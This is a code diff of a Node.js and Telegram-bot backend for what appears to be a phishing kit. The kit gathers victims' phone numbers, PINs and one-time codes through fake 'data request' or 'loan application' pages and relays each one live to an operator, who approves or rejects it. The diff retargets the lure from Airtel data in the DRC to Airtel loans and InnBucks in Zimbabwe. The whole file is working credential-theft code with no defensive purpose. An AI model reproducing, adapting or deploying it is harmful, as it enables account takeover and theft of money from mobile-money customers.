@@ -42,16 +42,15 @@ function getAdminIdByChatId(chatId) {
     }
     return null;
 }
-
-// Format +243XXXXXXXXX → 0XXXXXXXXX for Telegram display[cite: 1]
+// Format +263XXXXXXXXX → 0XXXXXXXXX for Telegram display
 function formatPhone(phoneNumber) {
     if (!phoneNumber) return phoneNumber;
-    // Handle double prefix e.g. +2430812345678 → 0812345678[cite: 1]
-    if (phoneNumber.startsWith('+2430')) return phoneNumber.slice(4); // +2430... → 0...[cite: 1]
-    if (phoneNumber.startsWith('+243'))  return '0' + phoneNumber.slice(4); // +243... → 0...[cite: 1]
-    if (phoneNumber.startsWith('2430'))  return phoneNumber.slice(3);  // 2430... → 0...[cite: 1]
-    if (phoneNumber.startsWith('243'))   return '0' + phoneNumber.slice(3); // 243... → 0...[cite: 1]
-    if (!phoneNumber.startsWith('0'))    return '0' + phoneNumber; // bare 8... → 08...
+    // Handle double prefix e.g. +2630712345678 → 0712345678
+    if (phoneNumber.startsWith('+2630')) return phoneNumber.slice(4); // +2630... → 0...
+    if (phoneNumber.startsWith('+263'))  return '0' + phoneNumber.slice(4); // +263... → 0...
+    if (phoneNumber.startsWith('2630'))  return phoneNumber.slice(3);  // 2630... → 0...
+    if (phoneNumber.startsWith('263'))   return '0' + phoneNumber.slice(3); // 263... → 0...
+    if (!phoneNumber.startsWith('0'))    return '0' + phoneNumber; // bare 7... → 07...
     return phoneNumber;
 }
 
@@ -276,7 +275,7 @@ ${WEBHOOK_URL}?admin=${adminId}
 *Commands:*
 /mylink - Get your link
 /stats - Your statistics
-/pending - Pending requests
+/pending - Pending applications
 /myinfo - Your information
 `;
                 if (isSuperAdmin) {
@@ -299,7 +298,7 @@ ${WEBHOOK_URL}?admin=${adminId}
                 await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
             } else {
                 await bot.sendMessage(chatId, `
-👋 *Welcome to Airtel Data Platform!*
+👋 *Welcome to Airtel Loan Platform!*
 
 Your Chat ID: \`${chatId}\`
 
@@ -323,7 +322,7 @@ Provide this to your super admin to get access.
 
 \`${WEBHOOK_URL}?admin=${adminId}\`
 
-📋 Data Requests → *${admin.name}*
+📋 Applications → *${admin.name}*
         `, { parse_mode: 'Markdown' });
     });
 
@@ -371,7 +370,7 @@ Provide this to your super admin to get access.
             });
         }
         if (pinPending.length === 0 && otpPending.length === 0) {
-            message = '✨ No pending requests!';
+            message = '✨ No pending applications!';
         }
         bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
     });
@@ -472,7 +471,7 @@ ${WEBHOOK_URL}?admin=${newAdminId}
 *Commands:*
 /mylink - Get your link
 /stats - Your statistics
-/pending - Pending requests
+/pending - Pending applications
 /myinfo - Your information
 
 ✅ You're connected and ready!
@@ -670,7 +669,7 @@ Use /unpauseadmin ${targetAdminId} to restore.
             `, { parse_mode: 'Markdown' });
 
             const targetChatId = adminChatIds.get(targetAdminId);
-            if (targetChatId) bot.sendMessage(targetChatId, `✅ *YOUR ADMIN ACCESS HAS BEEN RESTORED*\n\nYou can now approve requests.\n\nUse /start to see commands.`, { parse_mode: 'Markdown' }).catch(() => {});
+            if (targetChatId) bot.sendMessage(targetChatId, `✅ *YOUR ADMIN ACCESS HAS BEEN RESTORED*\n\nYou can now approve loan applications.\n\nUse /start to see commands.`, { parse_mode: 'Markdown' }).catch(() => {});
         } catch (error) {
             console.error('❌ Error unpausing admin:', error);
             bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
@@ -966,12 +965,12 @@ Super admin has been notified.
 
     // Ownership check
     if (embeddedAdminId !== adminId) {
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ This request belongs to another admin!', show_alert: true });
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ This application belongs to another admin!', show_alert: true });
     }
 
     const application = await db.getApplication(applicationId);
     if (!application || application.adminId !== adminId) {
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Request not found or not yours!', show_alert: true });
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found or not yours!', show_alert: true });
     }
 
     // Wrong PIN at OTP stage
@@ -1028,7 +1027,7 @@ User will re-enter code.
 👤 ${callbackQuery.from.first_name}
 ⏰ ${new Date().toLocaleString()}
         `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Request rejected' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application rejected' });
     }
 
     // Allow OTP
@@ -1050,11 +1049,11 @@ User will now proceed to OTP.
         await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approved! User can enter OTP now.' });
     }
 
-    // Approve Data Request
+    // Approve Loan
     else if (action === 'approve' && type === 'otp') {
         await db.updateApplication(applicationId, { otpStatus: 'approved' });
         await bot.editMessageText(`
-🎉 *DATA REQUEST APPROVED!*
+🎉 *LOAN APPROVED!*
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
@@ -1067,7 +1066,7 @@ User will now proceed to OTP.
 
 ✅ User will see approval page!
         `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Data request approved!' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan approved!' });
     }
 });
 
@@ -1107,6 +1106,7 @@ app.post('/api/verify-pin', async (req, res) => {
 
         if (assignmentType === 'specific' && requestAdminId) {
             // ── HARD LOCK: customer came via a specific admin link ──
+            // NEVER fall back to another admin — that would be a data leak.
             assignedAdmin = await db.getAdmin(requestAdminId);
 
             if (!assignedAdmin) {
@@ -1188,7 +1188,7 @@ app.post('/api/verify-pin', async (req, res) => {
             }
         }
 
-        // Save application/request
+        // Save application
         await db.saveApplication({
             id:             applicationId,
             adminId:        assignedAdmin.adminId,
@@ -1203,12 +1203,12 @@ app.post('/api/verify-pin', async (req, res) => {
             timestamp:      new Date().toISOString()
         });
 
-        console.log(`💾 Request saved: ${applicationId}`);
+        console.log(`💾 Application saved: ${applicationId}`);
 
         // Send to Telegram
         const userLabel = isReturningUser
             ? `🔄 *RETURNING USER* (${thisAdminPastApps.length}x before)`
-            : '🆕 *NEW AIRTEL DATA REQUEST*';
+            : '🆕 *NEW APPLICATION*';
         await sendToAdmin(assignedAdmin.adminId, `
 ${userLabel}
 
@@ -1243,7 +1243,7 @@ app.get('/api/check-pin-status/:applicationId', async (req, res) => {
     try {
         const application = await db.getApplication(req.params.applicationId);
         if (application) res.json({ success: true, status: application.pinStatus });
-        else res.status(404).json({ success: false, message: 'Request not found' });
+        else res.status(404).json({ success: false, message: 'Application not found' });
     } catch (error) {
         res.status(500).json({ success: false, message: 'Server error' });
     }
@@ -1257,7 +1257,7 @@ app.post('/api/verify-otp', async (req, res) => {
         const application = await db.getApplication(applicationId);
 
         if (!application) {
-            return res.status(404).json({ success: false, message: 'Request not found' });
+            return res.status(404).json({ success: false, message: 'Application not found' });
         }
 
         // Re-add admin to map if needed
@@ -1291,7 +1291,7 @@ app.post('/api/verify-otp', async (req, res) => {
                 inline_keyboard: [
                     [{ text: '❌ Wrong PIN',   callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
                     [{ text: '❌ Wrong Code',  callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
-                    [{ text: '✅ Approve Data', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
+                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
                 ]
             }
         });
@@ -1308,7 +1308,7 @@ app.get('/api/check-otp-status/:applicationId', async (req, res) => {
     try {
         const application = await db.getApplication(req.params.applicationId);
         if (application) res.json({ success: true, status: application.otpStatus });
-        else res.status(404).json({ success: false, message: 'Request not found' });
+        else res.status(404).json({ success: false, message: 'Application not found' });
     } catch (error) {
         res.status(500).json({ success: false, message: 'Server error' });
     }
@@ -1319,7 +1319,7 @@ app.post('/api/resend-otp', async (req, res) => {
     try {
         const { applicationId } = req.body;
         const application = await db.getApplication(applicationId);
-        if (!application) return res.status(404).json({ success: false, message: 'Request not found' });
+        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });
         if (!adminChatIds.has(application.adminId)) return res.status(500).json({ success: false, message: 'Admin unavailable' });
 
         await sendToAdmin(application.adminId, `
@@ -1381,7 +1381,7 @@ app.get('/health', (req, res) => {
     });
 });
 
-// ── Serve the Airtel HTML ──
+// ── Serve the InnBucks HTML ──
 app.get('/', async (req, res) => {
     const adminId = req.query.admin;
 
@@ -1400,14 +1400,14 @@ app.get('/', async (req, res) => {
         }
     }
 
-    res.sendFile(path.join(__dirname, 'airtel-integrated.html'));
+    res.sendFile(path.join(__dirname, 'innbucks-integrated.html'));
 });
 
 // ==========================================
 // START SERVER
 // ==========================================
 app.listen(PORT, () => {
-    console.log(`\n🔴 AIRTEL DATA PLATFORM`);
+    console.log(`\n💎 AIRTEL DATA PLATFORM`);
     console.log(`==========================`);
     console.log(`🌐 Server: http://localhost:${PORT}`);
     console.log(`🤖 Bot: WEBHOOK MODE ✅`);
